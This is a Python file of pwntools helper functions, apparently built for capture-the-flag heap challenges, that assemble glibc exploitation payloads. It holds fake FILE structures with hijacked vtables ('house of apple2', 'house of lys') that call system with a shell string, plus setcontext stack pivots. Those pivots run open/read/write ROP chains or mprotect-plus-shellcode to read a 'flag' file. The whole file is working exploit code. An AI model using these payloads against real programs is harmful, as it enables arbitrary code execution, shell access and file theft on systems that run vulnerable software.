from pwn import p64, ELF, asm, flat
from gadget import *
from pwnvar import pwnlibc


def house_of_apple2(target_addr: int):
    jumps = pwnlibc.sym['_IO_wfile_jumps']
    system = pwnlibc.sym['system']
    wide_addr = target_addr
    vtable_addr = target_addr
    payload = b'   ;sh'.ljust(8, b'\x00')
    payload = payload.ljust(0x28, b'\x00')
    payload += p64(1)
    payload = payload.ljust(0x68, b'\x00')
    payload += p64(system)
    payload = payload.ljust(0xa0, b'\x00')
    payload += p64(wide_addr)
    payload = payload.ljust(0xd8, b'\x00')
    payload += p64(jumps)
    payload = payload.ljust(0xe0, b'\x00')
    payload += p64(vtable_addr)
    return payload

def stack_pivot_orw_by_shellcode(target_addr: int, file_name: bytes = b'flag'):
    shellcode = """
    xor rdx,rdx
    mov dh, 0x2
    mov rdi,{}
    xor esi,esi  
    mov eax,2
    syscall
    mov rsi,rdi
    mov edi,eax
    xor eax,eax
    syscall
    xor edi,2
    mov eax,edi
    syscall
    """.format(hex(target_addr + 0xb0))

    heap_first = target_addr
    setcontext = pwnlibc.sym['setcontext'] + 61
    mprotect_addr = pwnlibc.sym['mprotect']
    payload = p64(heap_first + 0x28) + p64(heap_first)
    payload = payload.ljust(0x20, b'\x00') + p64(setcontext)
    payload += asm(shellcode)
    payload = payload.ljust(0x68, b'\x00') + p64(heap_first & 0xfffffffffffff000)
    payload = payload.ljust(0x70, b'\x00') + p64(0x2000)
    payload = payload.ljust(0x88, b'\x00') + p64(7)
    payload = payload.ljust(0xa0, b'\x00') + p64(heap_first)
    payload = payload.ljust(0xa8, b'\x00') + p64(mprotect_addr)
    payload += file_name + b'\x00'
    return payload

def house_of_apple2_orw(target_addr: int, file_name: bytes = b'flag', mode: str = 'shellcode'):
    jumps = pwnlibc.sym['_IO_wfile_jumps']
    wide_addr = target_addr
    vtable_addr = target_addr
    magic = get_magic_gadget1()
    payload = p64(0) + p64(target_addr + 0x100 - 0x20)
    payload = payload.ljust(0x28, b'\x00')
    payload += p64(1)
    payload = payload.ljust(0x68, b'\x00')
    payload += p64(magic)
    payload = payload.ljust(0xa0, b'\x00')
    payload += p64(wide_addr)
    payload = payload.ljust(0xd8, b'\x00')
    payload += p64(jumps)
    payload = payload.ljust(0xe0, b'\x00')
    payload += p64(vtable_addr)
    payload = payload.ljust(0x100, b'\x00')
    if mode == 'shellcode':
        tmp = stack_pivot_orw_by_shellcode(target_addr + 0xe0, file_name)
    else:
        tmp = stack_pivot_orw_by_rop(target_addr + 0xe0, file_name)
    tmp = tmp[0x20:]
    payload += tmp

    return payload


def stack_pivot_orw_by_rop(target_addr: int, file_name: bytes = b'flag'):
    pop_rdi_addr = get_pop_rdi()
    pop_rsi_addr = get_pop_rsi()
    pop_rdx_r12_addr = get_pop_rdx_r12()  # pop_rdx_r12_ret
    pop_rax_addr = get_pop_rax()
    syscall_addr = get_syscall()
    ret_addr = get_ret()
    magic_addr = get_magic_gadget1()
    setcontext_addr = pwnlibc.sym['setcontext'] + 61
    flag_addr = target_addr + 0xe0

    payload = p64(0) + p64(target_addr) + p64(0) * 2 + p64(setcontext_addr)
    payload += p64(pop_rdi_addr) + p64(flag_addr) + p64(pop_rsi_addr) + p64(0)
    payload += p64(pop_rax_addr) + p64(2) + p64(syscall_addr)  # open
    payload += p64(pop_rdi_addr) + p64(3) + p64(pop_rsi_addr) + p64(flag_addr + 0x10) + p64(pop_rax_addr) + p64(0)
    payload += p64(pop_rdx_r12_addr) + p64(0x70) + p64(target_addr + 0x28) + p64(ret_addr) + p64(
        syscall_addr)  # read
    payload += p64(pop_rdi_addr) + p64(1) + p64(pop_rax_addr) + p64(1) + p64(syscall_addr)  # write
    payload += file_name + b'\x00'
    return magic_addr, payload


def house_of_lys(target_addr: int):
    payload = flat(
        {
            0x18: 1,
            0x20: 0,
            0x28: 1,
            0x30: 0,
            0x38: pwnlibc.sym["system"],
            0x48: target_addr + 0xa0,
            0x50: 1,
            0xa0: 0x68732f6e69622f,
            0xd8: pwnlibc.sym["_IO_obstack_Jumps"] + 0x20,
            0xe0: target_addr
        },
        filler='\x00'
    )
    return payload


def house_of_lys_orw(target_addr: int, file_name: bytes = b'flag'):
    gg1 = get_magic_gadget1()
    gg2 = get_magic_gadget2()
    gg3 = get_magic_gadget3()

    pop_rdi_addr = get_pop_rdi()
    pop_rsi_addr = get_pop_rsi()
    pop_rdx_r12_addr = get_pop_rdx_r12()  # pop_rdx_r12_ret
    pop_rax_addr = get_pop_rax()
    syscall_addr = get_syscall()
    ret_addr = get_ret()

    rop_payload = p64(pop_rdi_addr) + p64(target_addr + 0xa0) + p64(pop_rsi_addr) + p64(0)
    rop_payload += p64(pop_rax_addr) + p64(2) + p64(syscall_addr)  # open
    rop_payload += p64(pop_rdi_addr) + p64(3) + p64(pop_rsi_addr) + p64(target_addr + 0xa0) + p64(
        pop_rax_addr) + p64(0)
    rop_payload += p64(pop_rdx_r12_addr) + p64(0x70) + p64(target_addr + 0x28) + p64(ret_addr) + p64(
        syscall_addr)  # read
    rop_payload += p64(pop_rdi_addr) + p64(1) + p64(pop_rax_addr) + p64(1) + p64(syscall_addr)  # write

    payload = flat(
        {
            0x18: 1,
            0x20: 0,
            0x28: 1,
            0x30: 0,
            0x38: gg1,
            0x48: target_addr + 0xe8,
            0x50: 1,
            0xa0: file_name,
            0xd8: pwnlibc.sym["_IO_obstack_Jumps"] + 0x20,
            0xe0: target_addr,
            0xe8: {
                0x0: gg3,
                0x8: target_addr + 0xe8,  # Maybe sometimes you need to replace this address
                0x20: gg2,
                0x40: rop_payload
            }
        },
        filler='\x00'
    )
    return payload
